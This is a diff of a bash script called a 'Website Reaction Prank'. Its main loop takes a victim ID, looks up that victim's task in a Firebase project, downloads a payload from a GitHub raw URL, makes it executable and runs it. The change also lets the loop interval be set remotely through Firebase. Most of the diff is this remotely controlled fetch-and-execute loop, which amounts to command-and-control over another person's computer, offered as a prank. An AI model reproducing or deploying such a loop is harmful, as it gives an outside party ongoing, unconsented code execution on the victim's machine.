@@ -10,7 +10,6 @@ payloadPrefix="https://raw.githubusercontent.com/thiesgehrmann/"
 
 ###################################################################
  # Configuration variables
-rootLoopTime=60
 
 localTaskData="$SCRIPTDIR/taskdata"
 localPayloadFile="$SCRIPTDIR/payload"
@@ -19,14 +18,7 @@ localPayloadURLFile="$SCRIPTDIR/payload.url"
 
 ###################################################################
 
-function installJQ() {
-  if [ -e "$jq" ]; then
-    curl -L -s "https://github.com/stedolan/jq/releases/download/jq-1.5/jq-osx-amd64" > "$jq"
-    chmod +x "$jq"
-  fi
-}
-
-###################################################################
+# General purpose functions
 
 function urlExists(){
   local url="$1"
@@ -35,15 +27,6 @@ function urlExists(){
   else
     echo 0
   fi
-}
-
-function getURLETag(){
-  #echo "getURLETag: $1" >&2
-  local remoteURL="$1"
-
-  curl -s -H 'Cache-Control: no-cache' -I "$remoteURL" \
-   | grep '^ETag' \
-   | cut -d'"' -f2
 }
 
 function getTaskID(){
@@ -78,73 +61,109 @@ function setVictimTask() {
   fi
 }
 
-function getPayloadURL(){
-  #echo "getPayloadURL: $1" >&2
-  local url="$1"
-  local victimID="$2"
-  
-  local payloadID=`getTaskID "$victimID"`
-  echo "getPayloadURL: $payloadID" >&2
-  if [ "$payloadID" == "null" ]; then
-    echo "${payloadPrefix}`getTaskURL 'default'`"
+function getIterationLength() {
+
+  local length=`curl -s "https://${firebaseProject}.firebaseio.com/iterationLength.json"`
+
+  if [ ! -z "$length" ] && [ $length -eq $length ]; then
+    echo "$length"
   else
-    echo "${payloadPrefix}`getTaskURL \"$payloadID\"`"
+    echo "60"
   fi
 }
 
-function downloadURL(){
-  #echo "downloadURL: $1, $2"
-  local url="$1"
+function setIterationLength() {
+  local length="$1"
 
-  local outfile="$2"
-  echo "downloadURL: Downloading $url"
-  curl -s -L "$url" > "$outfile"
-  chmod +x "$outfile"
-}
-
-function downloadPayloadIfNeeded(){
-  local victimID="$1"
-  local remoteURL=`getPayloadURL "$taskURL" "$victimID"`
-  local remoteURLETag=`getURLETag "$remoteURL"`
-  localURL=`head -n1 "$localPayloadURLFile"`
-  localETag=`head -n1 "$localPayloadETagFile"`
-
-  echo "downloadPayloadIfNeeded: l-> $localURL"
-  echo "downloadPayloadIfNeeded: r-> $remoteURL"
-  echo "downloadPayloadIfNeeded: l-> $localETag"
-  echo "downloadPayloadIfNeeded: r-> $remoteURLETag"
-
-    # We have a totally new URL, we should get it no matter what!
-  if [ "$remoteURL" != "$localURL" ]; then
-    echo "downloadPayloadIfNeeded: We have a new URL!"
-    downloadURL "$remoteURL" "$localPayloadFile"
-    echo "$remoteURL" > "$localPayloadURLFile"
-    echo "$remoteURLETag" > "$localPayloadETagFile"
-
+  if [ ! -z "$length" ] && [ $length -eq $length ] 2>/dev/null; then
+    curl -s -X PUT -d "$length" "https://${firebaseProject}.firebaseio.com/iterationLength.json"  > /dev/null
   else
-    echo "downloadPayloadIfNeeded: Same URL"
-
-    if [ "$localETag" != "$remoteURLETag" ]; then
-      echo "downloadPayloadIfNeeded: The payload has been updated!"
-      downloadURL "$remoteURL" "$localPayloadFile"
-      echo "$remoteURLETag" > "$localPayloadETagFile"
-    fi
+    usage
+    exit 1
   fi
-
-}
-
-function runPayload() {
-  echo "runPayload: Running"
-  local victimID="$1"
-  local iteration="$2"
-  "$localPayloadFile" "$victimID" "$iteration"
 }
 
 
 ###################################################################
+###################################################################
+###################################################################
 
+# Core deployment functionality
 # Only perform the next steps if we are not being sourced
 if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
+
+  function getURLETag(){
+    #echo "getURLETag: $1" >&2
+    local remoteURL="$1"
+  
+    curl -s -H 'Cache-Control: no-cache' -I "$remoteURL" \
+     | grep '^ETag' \
+     | cut -d'"' -f2
+  }
+  
+  function getPayloadURL(){
+    #echo "getPayloadURL: $1" >&2
+    local url="$1"
+    local victimID="$2"
+    
+    local payloadID=`getTaskID "$victimID"`
+    echo "getPayloadURL: $payloadID" >&2
+    if [ "$payloadID" == "null" ]; then
+      echo "${payloadPrefix}`getTaskURL 'default'`"
+    else
+      echo "${payloadPrefix}`getTaskURL \"$payloadID\"`"
+    fi
+  }
+  
+  function downloadURL(){
+    #echo "downloadURL: $1, $2"
+    local url="$1"
+  
+    local outfile="$2"
+    echo "downloadURL: Downloading $url"
+    curl -s -L "$url" > "$outfile"
+    chmod +x "$outfile"
+  }
+  
+  function downloadPayloadIfNeeded(){
+    local victimID="$1"
+    local remoteURL=`getPayloadURL "$taskURL" "$victimID"`
+    local remoteURLETag=`getURLETag "$remoteURL"`
+    localURL=`head -n1 "$localPayloadURLFile"`
+    localETag=`head -n1 "$localPayloadETagFile"`
+  
+    echo "downloadPayloadIfNeeded: l-> $localURL"
+    echo "downloadPayloadIfNeeded: r-> $remoteURL"
+    echo "downloadPayloadIfNeeded: l-> $localETag"
+    echo "downloadPayloadIfNeeded: r-> $remoteURLETag"
+  
+      # We have a totally new URL, we should get it no matter what!
+    if [ "$remoteURL" != "$localURL" ]; then
+      echo "downloadPayloadIfNeeded: We have a new URL!"
+      downloadURL "$remoteURL" "$localPayloadFile"
+      echo "$remoteURL" > "$localPayloadURLFile"
+      echo "$remoteURLETag" > "$localPayloadETagFile"
+  
+    else
+      echo "downloadPayloadIfNeeded: Same URL"
+  
+      if [ "$localETag" != "$remoteURLETag" ]; then
+        echo "downloadPayloadIfNeeded: The payload has been updated!"
+        downloadURL "$remoteURL" "$localPayloadFile"
+        echo "$remoteURLETag" > "$localPayloadETagFile"
+      fi
+    fi
+  
+  }
+  
+  function runPayload() {
+    echo "runPayload: Running"
+    local victimID="$1"
+    local iteration="$2"
+    "$localPayloadFile" "$victimID" "$iteration"
+  }
+  
+  ###################################################################
 
   victim="$1"
   if [ -z "$victim" ]; then
@@ -165,7 +184,9 @@ if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
   iteration=1
   
   while [ true ]; do
-  
+
+    rootLoopTime=`getIterationLength`
+ 
     echo "###################################"
     echo "# Website Reaction Prank         "
     echo "# VictimID: $victim              "
